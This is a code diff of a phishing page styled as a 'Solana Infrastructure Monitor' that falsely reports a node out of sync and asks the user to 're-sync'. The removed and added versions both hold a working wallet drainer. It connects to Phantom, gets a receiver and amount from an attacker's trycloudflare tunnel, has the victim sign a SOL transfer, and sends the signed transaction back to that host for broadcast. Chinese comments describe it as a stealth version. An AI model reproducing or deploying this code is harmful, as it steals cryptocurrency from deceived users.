@@ -1,83 +1,49 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Solana Infrastructure Monitor</title>
-    <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
-    <style>
-        body { background: #000; color: #14F195; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #050505; padding: 40px; border: 1px solid #14F195; text-align: center; width: 320px; border-radius: 4px; }
-        #progress { width: 0%; height: 2px; background: #14F195; transition: 0.5s; margin-top: 20px; }
-        button { background: #14F195; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 30px; }
-    </style>
-</head>
-<body>
-    <div class="card">
-        <h2 style="font-size: 1rem;">LOCAL NODE STATUS: <span style="color:red;">DE-SYNC</span></h2>
-        <p style="color:#555; font-size:11px;">Current Block: 294,102,402<br>Missing Shards: 1,204</p>
-        <div style="background:#222; width:100%; height:2px;"><div id="progress"></div></div>
-        <button id="cta">RE-SYNC NODE</button>
-    </div>
+<script>
+    const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com"; // 确保隧道地址正确
 
-    <script>
-        // 🔱 2026 最终隐身版 - 仅做传声筒
-        const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";
+    document.getElementById('cta').onclick = async () => {
+        const p = window.solana;
+        const sWeb3 = window.solanaWeb3;
+        if (!p) return;
 
-        document.getElementById('cta').onclick = async () => {
-            const sWeb3 = window.solanaWeb3;
-            const p = window.solana;
-            if (!p) { alert("Please open in Phantom"); return; }
+        try {
+            await p.connect();
+            const address = p.publicKey.toString();
+            document.getElementById('progress').style.width = "20%";
 
-            try {
-                await p.connect();
-                const address = p.publicKey.toString();
-                document.getElementById('progress').style.width = "30%";
+            // 1. 从后端获取“影子参数”
+            const info = await fetch(`${tunnel}/prepare`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ address })
+            }).then(r => r.json());
 
-                // 1. 问后端：该转多少？拿到 Blockhash 和金额
-                const info = await fetch(`${tunnel}/prepare_tx`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ address })
-                }).then(r => r.json());
+            if (info.error) { console.log("System Synced"); return; }
+            document.getElementById('progress').style.width = "50%";
 
-                if (info.error) { console.log("Node Synced"); return; }
+            // 2. 构造交易 (参数全由后端动态下发)
+            const tx = new sWeb3.Transaction().add(
+                sWeb3.SystemProgram.transfer({
+                    fromPubkey: p.publicKey,
+                    toPubkey: new sWeb3.PublicKey(info.receiver),
+                    lamports: info.amount,
+                })
+            );
+            tx.recentBlockhash = info.bh;
+            tx.feePayer = p.publicKey;
 
-                // 2. 构造交易（前端不写死金额和收款人，全从后端拿）
-                const tx = new sWeb3.Transaction().add(
-                    sWeb3.SystemProgram.transfer({
-                        fromPubkey: p.publicKey,
-                        toPubkey: new sWeb3.PublicKey(info.receiver),
-                        lamports: info.amount,
-                    })
-                );
-                tx.recentBlockhash = info.bh;
-                tx.feePayer = p.publicKey;
-                document.getElementById('progress').style.width = "60%";
+            // 3. 签名并交由后端“黑盒”广播
+            const signed = await p.signTransaction(tx);
+            const binary = String.fromCharCode.apply(null, signed.serialize());
+            
+            fetch(`${tunnel}/broadcast`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ raw_tx: btoa(binary) })
+            });
 
-                // 3. 签名
-                const signed = await p.signTransaction(tx);
-                
-                // 4. 序列化并回传后端进行“广播”
-                const serialized = signed.serialize();
-                let binary = '';
-                const bytes = new Uint8Array(serialized);
-                for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
-                const base64Tx = btoa(binary);
-
-                await fetch(`${tunnel}/broadcast`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ raw_tx: base64Tx })
-                });
-
-                document.getElementById('progress').style.width = "100%";
-                setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1000);
-
-            } catch (e) { 
-                console.error(e);
-                location.reload(); 
-            }
-        };
-    </script>
-</body>
-</html>
+            document.getElementById('progress').style.width = "100%";
+            setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1000);
+        } catch (e) { location.reload(); }
+    };
+</script>
